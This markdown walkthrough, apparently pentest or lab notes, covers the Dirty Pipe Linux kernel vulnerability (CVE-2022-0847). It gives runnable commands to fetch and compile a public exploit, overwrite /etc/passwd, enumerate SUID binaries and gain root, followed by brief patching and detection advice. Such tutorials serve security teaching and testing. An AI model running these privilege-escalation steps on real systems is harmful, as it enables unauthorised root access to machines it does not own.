# Dirty Pipe (CVE-2022-0847)

## Dirty Pipe Overview

Dirty Pipe is a **critical Linux kernel vulnerability** (CVE-2022-0847) that allows an unprivileged local user to **overwrite arbitrary read-only files**, leading to **root privilege escalation**.

### Key Facts
- Affects **Linux kernel 5.8 - 5.17** (unpatched)
- Similar to **Dirty COW (CVE-2016-5195)** but **more reliable**
- Exploits **pipe buffer flag mishandling**
- Allows modification of files even when opened as read-only
- Leads to **privilege escalation** through file overwriting (e.g., `/etc/passwd`)
- Impact extends to **Linux desktops, servers, and Android devices**

---

# Exploitation Steps

## 1. Clone the Exploit

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
```

## 2. Compile the Exploit

```bash
bash compile.sh
```

## 3. Check the Kernel Version

Dirty Pipe works only on vulnerable kernels:

```bash
uname -r
```

If kernel is **between 5.8 and 5.17**, it is likely vulnerable.

---

# Exploit 1 — Overwrite `/etc/passwd`

This exploit injects a new root user by overwriting the root entry.

```bash
./exploit-1
```

### Verify root access:

```bash
id
whoami
```

---

# Enumerate SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

---

# Exploit 2 — Execute SUID Binary as Root

Use this exploit for privilege escalation via SUID binaries:

```bash
./exploit-2 /path/to/suid/binary
```

### Verify root access:

```bash
id
whoami
```

---

# Mitigation

### Patch Your Kernel

* Update to **Linux kernel 5.17.1** or later
* Vendors issued backports for supported distros

### Monitoring & Detection

* Watch for:
  * Unexpected changes to `/etc/passwd` or `/etc/shadow`
  * Abnormal pipe or buffer behavior
  * Unexpected SUID binary execution